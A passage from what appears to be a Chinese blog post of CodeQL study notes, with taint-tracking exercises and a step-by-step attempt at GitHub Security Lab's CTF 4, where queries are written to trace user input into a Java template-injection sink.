      <span class="token keyword">call</span><span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>Constructor<span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.net"</span><span class="token punctuation">,</span> <span class="token string">"URL"</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
  }
}

<span class="token keyword">from</span> DataFlow::Node src<span class="token punctuation">,</span> DataFlow::Node sink<span class="token punctuation">,</span> Configuration config
<span class="token keyword">where</span> config<span class="token punctuation">.</span>hasFlow<span class="token punctuation">(</span>src<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>
<span class="token keyword">select</span> src<span class="token punctuation">,</span> <span class="token string">"This string constructs a URL $@."</span><span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"here"</span>
</code></pre>
<p>这里用了个新操作，exists，简单学习一下<br><a href="https://codeql.github.com/docs/ql-language-reference/expressions/#aggregations">expressions</a><br><a href="https://codeql.github.com/docs/ql-language-reference/formulas/#explicit-quantifiers">formulas</a><br>其实不看文档也能猜出来大概是怎么回事，竖线前面定义一个变量，竖线后面就是该变量需要满足的条件<br>这里就是要求目标node是java.net.URL的构造函数的第一个参数</p>
<p>写一个Demo</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">getURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"blog.z3ratu1.cn"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">echo</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">echoWithPadding</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> s<span class="token operator">+</span><span class="token string">":8080"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        String a <span class="token operator">=</span> <span class="token string">"www.z3ratu1.cn"</span><span class="token punctuation">;</span>
        String b <span class="token operator">=</span> <span class="token string">"test.z3ratu1.cn"</span><span class="token punctuation">;</span>
        String c <span class="token operator">=</span> <span class="token function">echo</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
        String d <span class="token operator">=</span> <span class="token function">echoWithPadding</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
        String e <span class="token operator">=</span> <span class="token function">getURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>具体的跟踪过程应该是封装在了Dataflow类里了，也就是把跨函数的直接相等类的操作全部获取到了，三个<code>z3ratu1.cn</code>全部被追踪到。换成污点追踪的类再try一下，直接把继承类换成<code>TaintTracking</code>即可，也把<code>:8080</code>给追踪上了</p>
<h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote>
<p>Write a class that represents flow sources from java.lang.System.getenv(..).</p>
</blockquote>
<p>有点抽象的问题，就是把跟着对象从java.net.URL换成了java.lang.System.getenv吧？不过也没说是字符串了。考虑着把构造函数的判断改成getQualifiedName直接判定函数权限定名。看了答案之后再次不知所云。。。</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">import</span> java

class GetenvSource extends MethodAccess {
  GetenvSource<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>Method m <span class="token operator">|</span> m <span class="token operator">=</span> this<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>
      m<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"getenv"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      m<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeSystem
    <span class="token punctuation">)</span>
  }
}
</code></pre>
<p>exist中除了第一个竖线外剩下的竖线都表示and，但是这个MethodAccess是个什么类。。。然后TypeSystem又是什么。。。看一眼文档。居然直接把这个类封装成了一个单独的类。。。<br><a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/JDK.qll/type.JDK$TypeSystem.html">Class TypeSystem</a></p>
<p>太抽象了，MethodAccess的描述是</p>
<blockquote>
<p>A method access is an invocation of a method with a list of arguments.</p>
</blockquote>
<p>这不是和Call差不多，然后这个类继承自Call类，那么Call的描述又是什么呢</p>
<blockquote>
<p>Any call to a callable.<br>This includes method calls, constructor and super constructor invocations, and constructors invoked through class instantiation.</p>
</blockquote>
<p>意思是构造函数不算MethodAccess咯？<br>虽然很抽象，但是这个类应该能捕捉到getenv这个函数调用，以及我的读题有一点问题</p>
<h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><blockquote>
<p>Using the answers from 2 and 3, write a query which finds all global data flows from getenv to java.net.URL.</p>
</blockquote>
<p>缝合一下，就把2的instanceof那里改一下就行，然后3中的类需要改成继承Dataflow</p>
<p>写一个样例</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">getEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">getEnvFullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">getEnvWithPadding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"ccc"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"ddd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token function">getEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token function">getEnvFullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        URL url4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token function">getEnvWithPadding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>能够追踪到padding外的所有getenv。然后加了padding的必然是用污点追踪实现<br>把继承的类改成污点追踪后找到所有getenv</p>
<h2 id="CodeQL-and-Chill"><a href="#CodeQL-and-Chill" class="headerlink" title="CodeQL and Chill"></a>CodeQL and Chill</h2><p>GitHub上codeql ctf第四题，java题<br><a href="https://securitylab.github.com/ctf/codeql-and-chill/">GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition</a><br>大意就是用户输入会触发模板注入可以打EL表达式，需要找到这条利用链。直接从GitHub上下载压缩包导入数据库即可（我直接从压缩包导入的数据库用不了，select “hello”都会报一个没头没脑的什么tuple错误，解压之后再导入似乎就能用了，然后那个导入导入了我四五分钟。。。）</p>
<p>然后随便进行个查询也要半分钟。。。刚好边查边写了</p>
<h3 id="Step-1-Data-flow-and-taint-tracking-analysis"><a href="#Step-1-Data-flow-and-taint-tracking-analysis" class="headerlink" title="Step 1: Data flow and taint tracking analysis"></a>Step 1: Data flow and taint tracking analysis</h3><h4 id="Step-1-1-Sources"><a href="#Step-1-1-Sources" class="headerlink" title="Step 1.1: Sources"></a>Step 1.1: Sources</h4><p>污点追踪对source进行定义。继承一个TaintTracking::Configuration类，重写isSource方法即可，写了个破烂，然后跑起来一条都查不出来。。。</p>
<pre class=" language-sql"><code class="language-sql">    override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma<span class="token punctuation">,</span> Method m<span class="token punctuation">,</span> Interface i <span class="token operator">|</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>overridesOrInstantiates<span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">and</span> 
        i<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.validation"</span><span class="token punctuation">,</span> <span class="token string">"ConstraintValidator"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
        m<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"isValid"</span><span class="token punctuation">)</span> <span class="token operator">and</span> m<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">and</span> 
        source<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma
        <span class="token punctuation">)</span>
    }
</code></pre>
<p>实际上好像是不能这么查？看了一眼答案，答案是查的函数形参，为什么呢。魔改一下变成这样。能得出和答案一致的结果，但是答案的话是通过定义了一系列类来实现的</p>
<pre class=" language-sql"><code class="language-sql">    override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>Method m<span class="token punctuation">,</span> Method isValid <span class="token operator">|</span> m<span class="token punctuation">.</span>overridesOrInstantiates<span class="token operator">*</span><span class="token punctuation">(</span>isValid<span class="token punctuation">)</span> <span class="token operator">and</span> 
        isValid<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.validation"</span><span class="token punctuation">,</span> <span class="token string">"ConstraintValidator"</span><span class="token punctuation">,</span> <span class="token string">"isValid"</span><span class="token punctuation">)</span> <span class="token operator">and</span> 
        source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> m<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">and</span>
        m<span class="token punctuation">.</span>fromSource<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
    }
</code></pre>
<p>学习一下java继承的判断，也都是通过写新的类来实现的。。。<br><a href="https://codeql.github.com/docs/codeql-language-guides/types-in-java/#example-finding-mismatched-contains-checks">types-in-java</a></p>
<p>解构到类里面去，一层层的写也能一层层的debug，是一个良好的开发思路。</p>
<blockquote>
<p>Hints:</p>
</blockquote>
<ul>
<li>Make sure you catch only the implementations of methods defined in the ConstraintValidator interface.</li>
<li>There is a convenient class RemoteFlowSource that tells you when a particular data flow node is obtained from remote user input.</li>
<li>Pay attention to get only results that pertain to the project source code.</li>
</ul>
<p>第一点通过递归调用<code>overridesOrInstantiates</code>确认是否继承或重写对应函数<br>第二点不知道怎么用<br>第三点他的表述非常的奇怪，除了项目源码外这个数据库还需要分析哪呢？附带了jdk的代码？解决方案是加一个m.fromSource()，但实际上加了查出来的结果也没变（当做一个习惯记着吗？）</p>
<h4 id="Step-1-2-Sink"><a href="#Step-1-2-Sink" class="headerlink" title="Step 1.2: Sink"></a>Step 1.2: Sink</h4><p>sinks是ConstraintValidatorContext.buildConstraintViolationWithTemplate的第一个实参。这里有点怪？source是函数的形参，而sink是函数的实参。理论上来说都是实参的话我会好理解一点，为什么一个形参一个实参呢？</p>
<p>依葫芦画瓢的写一个即可，也能得到描述上所说的五个结果</p>
<pre class=" language-sql"><code class="language-sql">    override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma<span class="token punctuation">,</span> Method buildConstraintViolationWithTemplate<span class="token operator">|</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>overridesOrInstantiates<span class="token operator">*</span><span class="token punctuation">(</span>buildConstraintViolationWithTemplate<span class="token punctuation">)</span> <span class="token operator">and</span> 
        buildConstraintViolationWithTemplate<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.validation"</span><span class="token punctuation">,</span> <span class="token string">"ConstraintValidatorContext"</span><span class="token punctuation">,</span> <span class="token string">"buildConstraintViolationWithTemplate"</span><span class="token punctuation">)</span> <span class="token operator">and</span> 
        sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
       <span class="token punctuation">)</span>
    }
</code></pre>
<h4 id="Step-1-3-TaintTracking-configuration"><a href="#Step-1-3-TaintTracking-configuration" class="headerlink" title="Step 1.3: TaintTracking configuration"></a>Step 1.3: TaintTracking configuration</h4><p>写一个TaintTracking::Configuration类把isSource和isSink缝合进去，跑一下<br>然后跑不出结果来。。。。然后继续看文档，然后发现他在耍我</p>
<blockquote>
<p>Run your query using the command <code>CodeQL: Run Query</code> (either in the Command Palette or the right-click menu). It should give you … <strong>0 results</strong>! Ok, this is disappointing! But don’t give up just now.</p>
</blockquote>
<h4 id="Step-1-4-Partial-Flow-to-the-rescue"><a href="#Step-1-4-Partial-Flow-to-the-rescue" class="headerlink" title="Step 1.4: Partial Flow to the rescue"></a>Step 1.4: Partial Flow to the rescue</h4><p>使用了全新的技术DataFlow::PartialPathGraph，需要重新import一下，并且和DataFlow::PathGraph还是互相冲突的，只能import一个。需要临时互相替换</p>
<p>由于步骤1.3中未能直接从source走到sink，故引入Partial Flow从source展示从source往下走的情况，用于调试。可以在config类中重写explorationLimit方法来限制步长，样例给的步长是10（感觉太大了）步长缩到5我的笔记本也有点吃不消。。。cpu没耗多少，倒是内存吃了四五个G。。。缩到3总算能在短时间内跑下来，4就已经四五分钟跑不出结果了。。。</p>
<p>根据1.3中的提示，目标位于<code>SchedulingConstraintSetValidator.java</code>，所以限制一下node位置，抄的答案（说起来这应该是已知漏洞反向复现时写查询语句的方式，而不是反向搜索漏洞，或者说我知道了这里有一个可能的漏洞然后现在编写查询语句找他是否会和用户输入关联起来？）</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">from</span> MyTaintTrackingConfig cfg<span class="token punctuation">,</span> DataFlow::PartialPathNode source<span class="token punctuation">,</span> DataFlow::PartialPathNode sink
<span class="token keyword">where</span>
  cfg<span class="token punctuation">.</span>hasPartialFlow<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> _<span class="token punctuation">)</span> <span class="token operator">and</span>
  source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getLocation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getFile<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getBaseName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"SchedulingConstraintValidator.java"</span>
<span class="token keyword">select</span> sink<span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"Partial flow from unsanitized user data"</span>
</code></pre>
<p>简单的看了下步长3的情况，发现有的地方都已经进了jdk的自带类里面去了。但是未能debug出问题在哪，也许可以以步长为3的终点重新为起点继续前进，就等于从这个点继续步长为3的搜索了。但是我的笔记本性能估计只能走三步，基本上没法调试了。。。他的默认步长是10估计就很好调试了吧</p>
<p>hint中有提到要读一下hasPartialFlow的文档，没有看到什么有意义的东西。是我没找到文档的位置吗</p>
<h4 id="Step-1-5-Identifying-a-missing-taint-step"><a href="#Step-1-5-Identifying-a-missing-taint-step" class="headerlink" title="Step 1.5: Identifying a missing taint step"></a>Step 1.5: Identifying a missing taint step</h4><p>直接告诉我codeQL没有将getter方法纳入到污点追踪的传递过程中，因此需要将getter方法连接起来</p>
<h4 id="Step-1-6-Adding-additional-taint-steps"><a href="#Step-1-6-Adding-additional-taint-steps" class="headerlink" title="Step 1.6: Adding additional taint steps"></a>Step 1.6: Adding additional taint steps</h4><p>继承一个TaintTracking::AdditionalTaintStep类并实现step方法来把断掉的连接续上<br>看了下这篇文章<a href="https://blog.jus4fun.xyz/article/115/">善用isAdditionalTaintStep和isSanitizer</a><br>我之前一直没有特别理解Call的getQualifier方法，虽然大概猜出来了可能是指调用该函数的对象。就比如<code>obj.func(arg)</code>这样子一个操作，call对象拿到的应该是这个调用的操作整体，然后getQualifier获取到obj，getMethod获取到func的定义，getCallee获取到当前函数调用。大致如此，英语水平有限对着他那个qualifier的描述看了半天看不懂</p>
<p><strong>写到这的时候发现这个破烂往C盘写缓存写了5个G差点把我C盘写爆</strong>，应该是1.4的污点追踪究极递归搞的。然后关了重启缓存清空之后一次查询又要两分钟组织数据库。。。越发觉得不好用了呢？</p>
<p>写下一个Step类</p>
<pre class=" language-sql"><code class="language-sql">class KeySetTaintStep extends TaintTracking::AdditionalTaintStep{
  override predicate step<span class="token punctuation">(</span>DataFlow::Node <span class="token number">f</span><span class="token punctuation">,</span> DataFlow::Node t<span class="token punctuation">)</span>{
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"keySet"</span> <span class="token operator">and</span> 
    ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSourceDeclaration<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"Map"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    <span class="token number">f</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> 
    t<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma
    <span class="token punctuation">)</span>
  }
}
</code></pre>
<p>如上所说，这个step将污点从obj转移到obj.keySet()这个调用的结果，过程一开始理解了半天。。。<br>但实际上我在一开始就感觉他能够将污点传递到keySet调用那去。。。？<br>语句如下</p>
<pre class=" language-java"><code class="language-java">value<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>String<span class="token operator">:</span><span class="token operator">:</span>toLowerCase<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>从三步跟进的情况来看，应该能跟进到value.keySet().stream()这里啊？还是说我没看懂他这个跟进的输出是什么</p>
<p>这里还踩了一个坑<br>一开始ma的判断条件为</p>
<pre class=" language-sql"><code class="language-sql">ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"Map"</span><span class="token punctuation">,</span> <span class="token string">"keySet"</span><span class="token punctuation">)</span>
</code></pre>
<p>感觉就一步到位了，然而这样子查不出来任何一个结果。。。并且我一开始还没发现，后来测试的时候才发现的，因为对TaintTracking::AdditionalTaintStep的quick evaluation是对全部step都搜索出来。直接看是看不懂的，后来对着答案的类单独对类计算，结果发现我自己写的语句当类计算时查不出结果来。。。以及文档的这个getSourceDeclaration方法完全看不懂在说什么</p>
<p>但是开头的config的source和sink也是这么写的却能查出答案来。。。</p>
<p><strong>又一个教训，判断条件写成类单独调试不会有坏处</strong></p>
<h4 id="Step-1-7-Adding-taint-steps-through-a-constructor"><a href="#Step-1-7-Adding-taint-steps-through-a-constructor" class="headerlink" title="Step 1.7: Adding taint steps through a constructor"></a>Step 1.7: Adding taint steps through a constructor</h4><p>不知道这么写对不对</p>
<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">// x -> HashSet(x)</span>
class HashSetTaintStep extends TaintTracking::AdditionalTaintStep {
  override predicate step<span class="token punctuation">(</span>DataFlow::Node <span class="token number">f</span><span class="token punctuation">,</span> DataFlow::Node t<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>ConstructorCall <span class="token keyword">call</span> <span class="token operator">|</span> <span class="token keyword">call</span><span class="token punctuation">.</span>getConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"HashSet"</span><span class="token punctuation">,</span> <span class="token string">"HashSet"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      <span class="token number">f</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">call</span><span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      t<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">call</span>
    <span class="token punctuation">)</span>
  }
}
</code></pre>
<p>trick<br>在寻找函数的时候感觉都要考虑一下继承，那么就使用如下的通用模板较为合适</p>
<pre class=" language-sql"><code class="language-sql">ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"stream"</span> <span class="token operator">and</span>
ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASourceSupertype<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"Collection"</span><span class="token punctuation">)</span>
</code></pre>
<p>但这个操作在上述hashmap时失效了，暂时不知道原因是什么。。。</p>
<h4 id="Step-1-8-Finish-line-for-our-first-issue"><a href="#Step-1-8-Finish-line-for-our-first-issue" class="headerlink" title="Step 1.8: Finish line for our first issue"></a>Step 1.8: Finish line for our first issue</h4><p>写了一大堆连接</p>
<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">// x -> x.keySet()</span>
class KeySetTaintStep extends TaintTracking::AdditionalTaintStep{
  override predicate step<span class="token punctuation">(</span>DataFlow::Node <span class="token number">f</span><span class="token punctuation">,</span> DataFlow::Node t<span class="token punctuation">)</span>{
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"keySet"</span> <span class="token operator">and</span> 
    ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSourceDeclaration<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"Map"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    <span class="token number">f</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> 
    t<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma
    <span class="token punctuation">)</span>
  }
}



<span class="token comment" spellcheck="true">// x -> x.getXXX()</span>
class GetterTaintStep extends TaintTracking::AdditionalTaintStep{
  override predicate step<span class="token punctuation">(</span>DataFlow::Node <span class="token number">f</span><span class="token punctuation">,</span> DataFlow::Node t<span class="token punctuation">)</span>{
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>indexOf<span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">and</span>
     <span class="token number">f</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
     t<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma
    <span class="token punctuation">)</span>
  }
}


<span class="token comment" spellcheck="true">// x -> HashSet(x)</span>
class HashSetTaintStep extends TaintTracking::AdditionalTaintStep {
  override predicate step<span class="token punctuation">(</span>DataFlow::Node <span class="token number">f</span><span class="token punctuation">,</span> DataFlow::Node t<span class="token punctuation">)</span> {
